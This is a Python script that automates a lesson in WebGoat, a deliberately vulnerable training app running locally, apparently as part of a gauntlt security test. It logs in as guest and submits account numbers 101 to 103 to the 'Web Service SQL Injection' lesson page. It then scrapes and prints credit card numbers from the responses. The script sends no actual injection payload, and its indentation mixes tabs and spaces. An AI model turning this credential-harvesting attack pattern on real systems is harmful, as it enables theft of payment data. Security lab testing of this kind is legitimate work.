import requests
import sys
import re
import argparse
import json


def test_sql(file_name):

	#session objects save the state of the session as it continues
	session = requests.Session()
    	headers={"Content-Type": "text/html;charset=ISO-8859-1"}
	webpage = 'http://127.0.0.1:8080/WebGoat/login.mvc'
	#initial GET request
	r_get = session.get(webpage)
    	try:
		cookiejar = r_get.cookies

		#make the POST request to get into the site
		payload = {'username': 'guest', 'password': 'guest'}
		result  = session.post('http://127.0.0.1:8080/WebGoat/j_spring_security_check;jsessionid=' + str(cookiejar['JSESSIONID']), data = payload)
		
		#second GET request to find the correct tab Web Services SQL Injection
		get_screen_menu = session.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc')

		#parse the GET results to get the correct Screen and Menu numbers
		temp_screen_number = ''
		temp_menu_number = ''
		i = 0

		find_screen_and_menu = ''.join(get_screen_menu.text.split(','))
		if "Web Service SQL Injection" in find_screen_and_menu:
			k = find_screen_and_menu.index("Web Service SQL Injection")


		find_screen_and_menu = find_screen_and_menu[k:]

		screen_number = find_screen_and_menu.split('Screen=')
		menu_number = find_screen_and_menu.split('menu=')
		while screen_number[1][i].isnumeric():
			temp_screen_number = temp_screen_number + screen_number[1][i]
			i = i + 1
		i = 0

		while menu_number[1][i].isnumeric():
			temp_menu_number = temp_menu_number + menu_number[1][i]
			i = i + 1

		#once the correct screen and menu numbers have been found, send GET requests
		#with them included so that the SQL Injection page is maintained
		vuln_page = session.get('http://127.0.0.1:8080/WebGoat/attack?Screen=' + temp_screen_number + '&menu=' + temp_menu_number)
		
		#The user ID numbers are 101, 102 and 103. Automate attack with those numbers.
		#Output all of the credit card numbers
		payload = {'account_number': '101', 'SUBMIT': 'Go!'}
		attack_1 = session.post('http://127.0.0.1:8080/WebGoat/attack?Screen=' + temp_screen_number + '&menu=' + temp_menu_number, data = payload)

		if "101" in attack_1.text:
			k = attack_1.text.index("101</td>")
		temp = attack_1.text[k:]
		cc_num_101_1 = ''
		i = 4
		while temp[i].isnumeric() is False:
			i = i + 1
		
		while temp[i].isnumeric():
			cc_num_101_1 = cc_num_101_1 + temp[i]
			i = i + 1
		print cc_num_101_1

		temp = temp[i:]
		i = i + 1

		if "101" in temp:
			k = temp.index("101</td>")

		temp = temp[k:]

		cc_num_101_2 = ''
		i = 4
		while temp[i].isnumeric() is False:
			i = i + 1
		while temp[i].isnumeric():
			cc_num_101_2 = cc_num_101_2 + temp[i]
			i = i + 1
		print cc_num_101_2

		payload = {'account_number': '102', 'SUBMIT': 'Go!'}
		attack_2 = session.post('http://127.0.0.1:8080/WebGoat/attack?Screen=' + temp_screen_number + '&menu=' + temp_menu_number, data = payload)

		if "102" in attack_2.text:
			k = attack_2.text.index("102</td>")
		temp = attack_2.text[k:]
		cc_num_102_1 = ''
		i = 4
		while temp[i].isnumeric() is False:
			i = i + 1
		
		while temp[i].isnumeric():
			cc_num_102_1 = cc_num_102_1 + temp[i]
			i = i + 1
		print cc_num_102_1

		temp = temp[i:]
		i = i + 1

		if "102" in temp:
			k = temp.index("102</td>")

		temp = temp[k:]

		cc_num_102_2 = ''
		i = 4
		while temp[i].isnumeric() is False:
			i = i + 1
		while temp[i].isnumeric():
			cc_num_102_2 = cc_num_102_2 + temp[i]
			i = i + 1
		print cc_num_102_2

		payload = {'account_number': '103', 'SUBMIT': 'Go!'}
		attack_3 = session.post('http://127.0.0.1:8080/WebGoat/attack?Screen=' + temp_screen_number + '&menu=' + temp_menu_number, data = payload)


		if "103" in attack_3.text:
			k = attack_3.text.index("103</td>")
		temp = attack_3.text[k:]
		cc_num_103_1 = ''
		i = 4
		while temp[i].isnumeric() is False:
			i = i + 1
		
		while temp[i].isnumeric():
			cc_num_103_1 = cc_num_103_1 + temp[i]
			i = i + 1
		print cc_num_103_1

		temp = temp[i:]
		i = i + 1

		if "103" in temp:
			k = temp.index("103</td>")

		temp = temp[k:]

		cc_num_103_2 = ''
		i = 4
		while temp[i].isnumeric() is False:
			i = i + 1
		while temp[i].isnumeric():
			cc_num_103_2 = cc_num_103_2 + temp[i]
			i = i + 1
		print cc_num_103_2
		

    	except Exception as e:
        	print e


#file_name = "attack file" the path is /home/hacker/test-gauntlt/injection-test/vuln-33.attack
file_name = "vuln-33.attack" 

test_sql(file_name)




